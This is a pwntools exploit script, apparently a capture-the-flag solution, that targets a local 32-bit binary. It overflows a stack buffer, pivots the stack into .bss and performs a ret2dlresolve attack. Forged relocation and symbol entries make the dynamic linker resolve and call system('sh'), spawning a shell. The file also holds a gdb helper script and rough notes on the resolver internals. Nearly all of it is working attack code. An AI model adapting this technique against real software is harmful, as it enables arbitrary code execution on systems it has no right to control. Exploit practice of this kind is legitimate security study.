from pwn import *

inputs = [b'ex4722', b"Well I didn't vote for you.\x00", b'ex4722']

exe = ELF('./tmp_bin')

gdbscript = r"""
define ld_load
    x/2x $esp
    set $stack = $esp + 4
    set $i =  *((char **) ($stack))
    printf "AT %p is %d\n", $stack, $i
    x/2wx 0x08048320 + $i 
    printf "R_info: %p\n", *( 0x08048320 + $i +4)
    set $rinfo = *(int)( 0x08048320 + $i +4)
    set $rsym = $rinfo >> 8 
    printf "R_sym: %p\n", $rsym 
    set $sym = 0x080481cc + 0x10 * $rsym
    printf "SYM : %p\n", $sym 
    x/6wx $sym
    printf "STR_OFF: %p\n", *$sym 
    set $sym =  *$sym 
    printf "Symbol: %s\n", $sym + 0x0804826c
end
c
"""


def new_processes():
    p = gdb.debug("./tmp_bin",gdbscript=gdbscript)
    for i in inputs:
        p.send(i)
    return p

#def rax_control():
#    payload = flat([
#        b"A"*55,
#        exe.plt.strlen,
#        # GADGET, pop ebx
#        0x08048d36,
#        #vuln.address_ranges[0].start,
#        # STRING
#        0x8048fc3,
#        0x08048d36,
#        0xdeadbeef,
#    ])
#    p.send(payload)

fake_table = exe.bss() + 0x800 + 0x24 + 0x24 

buf = exe.bss() + 0x800
JMPREL = 0x08048320
SYMTAB = 0x080481cc
STRTAB = 0x0804826c

dl_resolve_func = 0x8048380
resolver = 0x8048380

forged_ara = buf + 0x14
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8 #size of elf32_sym

align = 0x10 - ((elf32_sym - SYMTAB) % 0x10) #align to 0x10


elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) // 0x10

r_info = (index_sym << 8) | 0x7


elf32_rel = p32(exe.got['read']) + p32(r_info)
st_name = (elf32_sym + 0x10) - STRTAB
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)



p = new_processes()
leave_ret = 0x08048cab
payload = flat([
    b"A"*55,
    exe.plt.read,
    # RET ADDR , pop chain cause of read args, ebp control
    0x08048d18,
    0, # stdin
    # buf
    exe.bss() + 0x400,
    # size
    0x1337,
    # EBP HERE, new stack
    exe.bss() + 0x400,
    leave_ret,
])
p.send(payload)

buffer2 = b''
buffer2 += elf32_rel            # (buf+0x14)
buffer2 += b'A' * align
buffer2 += elf32_sym_struct     # (buf+0x20)
buffer2 += b"system\x00"
x = (100 - len(buffer2))
buffer2 += b'A' * x              #padding
buffer2 += b"sh\x00"
x = (0x80 - len(buffer2))
buffer2 += b"A" * x              #total read siz
p.send(buffer2)

stack = flat([
# leave ret, pops one
    b'A'*4,
    # Reading in dl resolve this time
    exe.plt.read,
    # RET ADDR , pop chain cause of read args, ebp control
    0x08048d18,
    0, # stdin
    # buf
    fake_table,
    # size
    0x1337,
    # EBP HERE
    exe.bss() + 32-4 + 0x400,
    leave_ret,
    # Next RIP
    0xdeabeef,
    dl_resolve_func,
    rel_offset,
    b'A'*4,
    buf+100,
    buffer2
])

p.send(stack)
input("DL")
p.send("HI")


# print("set *0x0804b40c=0x0804b8d4")

"""
How to ret 2 dl_resolve:
push val1
dl_runtime_resolve()
val1 + jumprel -(ONE ENTRY???) == Elf32_Rel  *reloc_table
    *reloc_table  = got addr
    *reloc_table +4 = r_info 
        ELF32_R_SYM == r_info >>8 
        ELF32_R_TYPE == r_info & 0xff ( 7 for GOT??)

func's symtab == symtab + ELF32_R_SYM * 24

name = STRTAB + func's symtab(First entry)


elf_machine_fixup_plt()
Writes result to got addr specificed


jmp_offset correct 
symtab_offset
strOffset WRONG

Messup upp ofset??
Strtab + 0 for some reason
adds it here _dl_fixup+228

Checking offset 
    _dl_fixup+120
"""

